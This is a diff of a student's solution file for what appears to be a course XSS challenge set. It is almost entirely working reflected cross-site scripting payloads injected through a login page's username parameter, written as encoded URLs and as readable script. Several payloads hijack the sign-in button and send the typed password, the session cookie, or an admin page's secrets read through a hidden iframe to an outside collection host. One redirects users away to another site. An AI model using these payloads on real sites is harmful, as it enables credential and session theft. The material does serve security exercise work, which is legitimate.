@@ -1,18 +1,26 @@
-http://xss-challenges.r7.io/admin/secrets
-
-http://xss-challenges.r7.io/0/login?username=%27%3E%3C/span%3E%3Cscript%3Ewindow.onload=function(){window.location="http://xss-challenges.r7.io/admin/secrets";document.querySelectorAll(%22.problem%22)[0].style.display=%22None%22;document.querySelectorAll(%22.error-message%22)[0].style.display=%22None%22;document.getElementById(%22signin-btn%22).onclick%20=%20function(e){e.preventDefault();window.location="https://students.washington.edu/kyleiws";}%20}%3C/script%3E%3Cspan%20style=%22display:none;%22%3E&password=hello&user_language=english
-
-
-1. Completed:
+1. Completed URL ----------------------------------------------------------------------------------------------------------------------
 http://xss-challenges.r7.io/0/login?username=%27%3E%3C/span%3E%3Cscript%3Ewindow.onload=function(){document.querySelectorAll(%22.problem%22)[0].style.display=%22None%22;document.querySelectorAll(%22.error-message%22)[0].style.display=%22None%22;document.getElementById(%22signin-btn%22).onclick%20=%20function(e){var%20img=document.createElement(%22img%22);%20img.src=%22http://r7.io/e/kyleiws?s=%22%2Bdocument.getElementById(%22login_password%22).value;document.body.appendChild(img);}%20}%3C/script%3E%3Cspan%20style=%22display:none;%22%3E&password=hello&user_language=english
 
-2. Completed
+1. ---------------------------------------- Pretty URL --------------------------------------------------------------------------------
+
+http://xss-challenges.r7.io/0/login?username='></span>
+<script>
+	window.onload=function(){
+		document.querySelectorAll(".problem")[0].style.display="None";
+		document.querySelectorAll(".error-message")[0].style.display="None";
+		document.getElementById("signin-btn").onclick = function(e){
+			var img=document.createElement("img"); 
+			img.src="http://r7.io/e/kyleiws?s="+document.getElementById("login_password").value;
+			document.body.appendChild(img);
+		} 
+	}
+</script><
+span style="display:none;">&password=hello&user_language=english
+
+2. Completed URL ----------------------------------------------------------------------------------------------------------------------
 http://xss-challenges.r7.io/0/login?username=%27%3E%3C/span%3E%3Cscript%3Ewindow.onload=function(){document.querySelectorAll(%22.problem%22)[0].style.display=%22None%22;document.querySelectorAll(%22.error-message%22)[0].style.display=%22None%22;document.getElementById(%22signin-btn%22).onclick%20=%20function(e){e.preventDefault();window.location="https://students.washington.edu/kyleiws";}%20}%3C/script%3E%3Cspan%20style=%22display:none;%22%3E&password=hello&user_language=english
 
-3. Completed
-http://xss-challenges.r7.io/0/login?username=%27%3E%3C/span%3E%3Cscript%3Ewindow.onload=function(){document.querySelectorAll(%22.problem%22)[0].style.display=%22None%22;document.querySelectorAll(%22.error-message%22)[0].style.display=%22None%22;document.getElementById(%22signin-btn%22).onclick%20=%20function(e){var%20img=document.createElement(%22img%22);%20img.src=%22http://r7.io/e/kyleiws?s=%22%2Bdocument.cookie;document.body.appendChild(img);}%20}%3C/script%3E%3Cspan%20style=%22display:none;%22%3E&password=hello&user_language=english
-
-4. 
+2. ---------------------------------------- Pretty URL --------------------------------------------------------------------------------
 
 http://xss-challenges.r7.io/0/login?username='></span>
 <script>
@@ -21,17 +29,63 @@ http://xss-challenges.r7.io/0/login?username='></span>
 		document.querySelectorAll(".error-message")[0].style.display="None";
 		document.getElementById("signin-btn").onclick = function(e){
 			e.preventDefault();
-			var iframe = document.createElement("iframe");
-			iframe.src = "http://students.washington.edu/caseyws/";
-			document.body.appendChild(iframe);
-			var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-			if(iframeDoc.readyState == 'complete') {
-				iframe.contentWindow.onload = function() {
-					console.log("hi");
-				}
-			}
-			
+			window.location="https://students.washington.edu/kyleiws";
 		} 
 	}
 </script>
 <span style="display:none;">&password=hello&user_language=english
+
+3. Completed URL ----------------------------------------------------------------------------------------------------------------------
+http://xss-challenges.r7.io/0/login?username=%27%3E%3C/span%3E%3Cscript%3Ewindow.onload=function(){document.querySelectorAll(%22.problem%22)[0].style.display=%22None%22;document.querySelectorAll(%22.error-message%22)[0].style.display=%22None%22;document.getElementById(%22signin-btn%22).onclick%20=%20function(e){var%20img=document.createElement(%22img%22);%20img.src=%22http://r7.io/e/kyleiws?s=%22%2Bdocument.cookie;document.body.appendChild(img);}%20}%3C/script%3E%3Cspan%20style=%22display:none;%22%3E&password=hello&user_language=english
+
+3. ---------------------------------------- Pretty URL --------------------------------------------------------------------------------
+
+http://xss-challenges.r7.io/0/login?username='></span>
+<script>
+	window.onload=function(){
+		document.querySelectorAll(".problem")[0].style.display="None";
+		document.querySelectorAll(".error-message")[0].style.display="None";
+		document.getElementById("signin-btn").onclick = function(e){
+			var img=document.createElement("img"); 
+			img.src="http://r7.io/e/kyleiws?s="%2Bdocument.cookie;
+			document.body.appendChild(img);
+		} 
+	}
+</script>
+<span style="display:none;">&password=hello&user_language=english
+
+4. Completed URL ----------------------------------------------------------------------------------------------------------------------
+http://xss-challenges.r7.io/0/login?username=%27%3E%3C/span%3E%20%3Cscript%3E%20window.onload=function(){%20document.querySelectorAll(%22.problem%22)[0].style.display=%22None%22;%20document.querySelectorAll(%22.error-message%22)[0].style.display=%22None%22;%20document.getElementById(%22signin-btn%22).onclick%20=%20function(e){%20e.preventDefault();%20var%20iframe%20=%20document.createElement(%22iframe%22);%20iframe.src%20=%20%22http://xss-challenges.r7.io/admin/secrets%22;%20iframe.style.width%20=%200;%20iframe.style.height%20=%200;%20document.body.appendChild(iframe);%20var%20iframeDoc%20=%20iframe.contentDocument%20||%20iframe.contentWindow.document;%20if(iframeDoc.readyState%20==%20%27complete%27)%20{%20iframe.contentWindow.onload%20=%20function()%20{%20var%20img=document.createElement(%22img%22);%20img.src=%22http://r7.io/e/kyleiws?s=%22%2Biframe.contentDocument.getElementById(%22secrets%22).innerHTML;%20img.style.display=%22none%22;%20document.body.appendChild(img);%20alert(iframe.contentDocument.getElementById(%22secrets%22).innerHTML);%20}%20}%20}%20}%20%3C/script%3E%20%3Cspan%20style=%22display:none;%22%3E&password=hello&user_language=english
+
+4. ---------------------------------------- Pretty URL --------------------------------------------------------------------------------
+
+http://xss-challenges.r7.io/0/login?username='></span>
+<script>
+	window.onload=function(){
+		document.querySelectorAll(".problem")[0].style.display="None";
+		document.querySelectorAll(".error-message")[0].style.display="None";
+		document.getElementById("signin-btn").onclick = function(e){
+			e.preventDefault();	
+			var iframe = document.createElement("iframe");
+			iframe.src = "http://xss-challenges.r7.io/admin/secrets";
+			iframe.style.width = 0;
+			iframe.style.height = 0;
+			document.body.appendChild(iframe);
+			var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+			if(iframeDoc.readyState == 'complete') {
+				iframe.contentWindow.onload = function() {
+					var img=document.createElement("img"); 
+					img.src="http://r7.io/e/kyleiws?s="%2Biframe.contentDocument.getElementById("secrets").innerHTML;
+					img.style.display="none";
+					document.body.appendChild(img);
+					alert(iframe.contentDocument.getElementById("secrets").innerHTML);
+				}
+			}
+		} 
+	}
+</script>
+<span style="display:none;">&password=hello&user_language=english
+
+
+Resources:
+Lots of web programming experience, and OWASP helped a little bit (to remind me how to use an iframe).
